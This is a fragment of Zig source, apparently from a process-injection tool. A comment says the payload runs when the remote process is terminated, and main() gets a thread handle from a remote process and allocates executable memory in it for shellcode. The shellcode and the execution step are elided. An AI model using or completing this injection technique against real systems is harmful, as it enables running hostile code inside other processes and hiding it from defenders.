...
// The payload executes when I terminate the remote process.
...
pub fn main() !void {
    ...
    const h_thread = try sec.thread.getFirstThreadHandleFromRemoteProcess(process.process_id);
    defer CloseHandle(h_thread);

    const shell_code_region = try code_injection.remote.allocateExecutableMemory(u8, process.h_process, shell_code);
